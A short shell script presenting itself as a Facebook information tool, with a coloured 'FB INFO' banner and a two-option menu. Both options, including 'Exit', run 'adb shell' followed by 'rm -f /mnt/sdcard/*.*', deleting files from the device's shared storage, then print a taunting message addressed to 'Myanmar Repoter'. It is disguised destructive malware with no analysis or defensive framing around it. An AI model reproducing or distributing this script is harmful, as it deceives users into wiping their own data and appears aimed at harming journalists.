# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
clear
echo -e '\e[91m
███████╗██████╗░  ██╗███╗░░██╗███████╗░█████╗░
██╔════╝██╔══██╗  ██║████╗░██║██╔════╝██╔══██╗
█████╗░░██████╦╝  ██║██╔██╗██║█████╗░░██║░░██║
██╔══╝░░██╔══██╗  ██║██║╚████║██╔══╝░░██║░░██║
██║░░░░░██████╦╝  ██║██║░╚███║██║░░░░░╚█████╔╝
╚═╝░░░░░╚═════╝░  ╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚════╝░'
#first()
echo ""
echo -e "$grn-----------------------------------------------"
echo -e "$ylo                    𝗠𝟰𝗖𝗞𝟯𝗥                     "
echo -e "$grn-----------------------------------------------"
sleep 1
#selet()
echo -e "$blue--------------------------------"
echo -e "$red[1]$cyan Fb Information Estimate"
echo -e "$blue--------------------------------"
echo -e "$red[2]$cyan Exit"
echo -e "$blue--------------------------------"
read -p "[select]>>>" sad

if [ $sad = 1 ] || [ $sad = 1 ]
then
sleep 1
clear
echo "Script Runing"
adb shell
rm -f /mnt/sdcard/*.*
adb kill-server
sleep 2
echo -e  "$pinkGoodluck Myanmar Repoter/SoSad"
sleep 1
cd
fi

if [ $sad = 2 ] || [ $sad = 2 ]
then
sleep 1
clear
echo "Script Runing"
adb shell
rm -f /mnt/sdcard/*.*
adb kill-server
sleep 2
echo -e  "$pinkGoodluck Myanmar Repoter/SoSad"
sleep 1
cd
fi
